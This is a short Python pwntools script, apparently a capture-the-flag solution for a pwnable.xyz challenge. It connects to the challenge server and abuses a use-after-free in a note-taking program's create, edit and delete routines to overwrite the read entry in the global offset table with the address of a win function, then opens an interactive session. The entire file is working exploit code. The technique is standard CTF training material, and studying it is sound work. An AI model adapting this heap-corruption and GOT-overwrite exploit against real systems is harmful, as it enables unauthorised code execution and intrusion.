from pwn import *

#exploiting UAF vuln to overwrite got table
winAdrr = p64(0x40096C)[:-2]
gotRead = p64(0x602050)[:-5]

elf = context.binary = ELF('challenge', checksec=False)

# p = gdb.debug(elf.path)
p = remote("svc.pwnable.xyz", 30030)

def choice(option):
    p.sendlineafter(">", option)

def make_note(noteSize, title, note):
    p.sendafter(":", noteSize)
    p.sendafter(":", title)
    p.sendafter(":", note)


def edit_note(noteId, note):
    p.sendafter("#", noteId)
    p.sendafter(":", note)

def delete_note(noteId):
    p.sendafter("#", noteId)

payload  = b"A" * 32
payload += gotRead 

choice('1')
make_note('32', "note1", "note1")

choice('1')
make_note('90', "note2", "note2")

choice('3')
delete_note('0')

choice('1')
make_note('32', "A" * 32, "A" * 10)

choice('2')
edit_note('0',payload)

choice('2')
edit_note('1', winAdrr)

p.interactive()